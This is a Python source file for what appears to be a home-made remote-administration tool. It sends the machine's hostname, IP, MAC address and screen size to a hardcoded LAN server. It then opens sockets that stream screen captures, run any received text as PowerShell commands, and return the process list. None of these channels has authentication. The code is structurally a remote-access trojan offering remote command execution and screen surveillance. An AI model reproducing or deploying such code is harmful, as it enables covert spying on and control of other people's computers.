import socket
import sys

import lz4.frame
from getmac import get_mac_address as gma
import random
from screeninfo import get_monitors
from threading import Thread
from mss import mss
import subprocess
import threading
import os

HOST = "192.168.2.75"  # The server's hostname or IP address
PORT = 65432  # The port used by the server


result = ""
process_list = ""
list_of_ports = range(20000, 60000)

def return_not_used_port():
    starting_port = 0
    port = random.choice(list_of_ports)
    while starting_port == 0:
        if is_port_in_use(port):
            port = random.choice(list_of_ports)
        else:
            starting_port = port

    return port


def is_port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0


def start_listening_for_commands(running_port):
    send_computer_information(running_port)


def send_computer_information(running_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        hostname = socket.getfqdn()
        # Wait to see if workes with outside lan connection
        ip_address = socket.gethostbyname(hostname)
        mac_address = gma()
        width, height = get_screen_width_height()
        data_to_send = [hostname, ip_address, str(running_port), mac_address, str(width), str(height)]
        encoded_data = '||'.join(data_to_send).encode()
        s.sendall(encoded_data)
        data = s.recv(1024)  # Close connection


def get_screen_width_height():
    width = ""
    height = ""
    for monitor in get_monitors():
        # print(str(monitor))
        # FOR TESTING THE PRIMARY MONITOR IS FALSE ( SECOND SCREEN )
        if str(monitor.is_primary) == "False":
            width = monitor.width
            height = monitor.height

    return width, height


def retreive_screen(conn, width, height):
    with mss() as mss_instance:
        recording_area = {'top': 0, 'left': 0, 'width': width, 'height': height}
        # Retrieve monitor instead of a specific area
        monitor_1 = mss_instance.monitors[2]

        while "recording":
            # Grab the screen with the dimensions of the recording_area
            image = mss_instance.grab(monitor_1)

            # Compresses the image data with lz4 compressing algorithm
            pixels = lz4.frame.compress(image.rgb)

            # Send the size of the pixels length
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))

            # Send the actual pixels length
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)

            # Send pixels
            conn.sendall(pixels)


def socket_listening(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))

        try:
            sock.listen(5)
            print('Server started.')

            while 'connected':
                if not 'connected':
                    conn.close()

                conn, addr = sock.accept()
                print('Client connected IP:', addr)
                width, height = get_screen_width_height()
                thread = Thread(target=retreive_screen, args=(conn, width, height))
                thread.start()


        finally:
            conn.close()

            # sock.close()


def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf


def run_command(command):
    command_result = subprocess.run(["powershell", "-Command", command], capture_output=True)
    global result
    result = command_result.stdout
    return command_result.stdout


def command_line_service(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))

        try:
            sock.listen(5)
            print('Server started.')
            conn, addr = sock.accept()
            print('Client connected IP:', addr)

            while 'connected':


                # NOT SENDING EVERYTHING, FIX TO SEND ALL THE INFORMATION AND THEN STOP
                command = conn.recv(1024)
                thread = Thread(target=run_command, args=(command,))
                thread.start()
                thread.join()
                global result

                # Send the size of the pixels length
                size = len(result)
                size_len = (size.bit_length() + 7) // 8
                conn.send(bytes([size_len]))

                # Send the actual pixels length
                size_bytes = size.to_bytes(size_len, 'big')
                conn.send(size_bytes)

                conn.sendall(result)

        finally:
            conn.close()

            # sock.close()

def return_process_list():
    # using command line to return the process list
    global process_list
    process_list = os.popen('wmic process get description, processid').read()
    return os.popen('wmic process get description, processid').read()

def process_list_service(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        try:
            sock.listen()
            print('Server started.')
            conn, addr = sock.accept()
            print('Client connected IP:', addr)

            while 'connected':
                data = conn.recv(1024)
                if data.decode() == "processes":
                    thread = Thread(target=return_process_list)
                    thread.start()
                    thread.join()
                    global process_list
                    size = len(process_list)
                    size_len = (size.bit_length() + 7) // 8
                    conn.send(bytes([size_len]))

                    # Send the actual pixels length
                    size_bytes = size.to_bytes(size_len, 'big')
                    conn.send(size_bytes)

                    conn.sendall(process_list.encode())
                    print(process_list)

        finally:
            conn.close()

def main():
    running_port = return_not_used_port()
    running_port = 6666
    print(running_port)
    send_computer_information(running_port)
    # width, height = get_screen_width_height()

    # Maybe run all functionalities on different threads

    # socket_listening("192.168.2.75", running_port)
    #command_line_service("192.168.2.75", running_port)
    process_list_service("192.168.2.75", running_port)



if __name__ == '__main__':
    main()
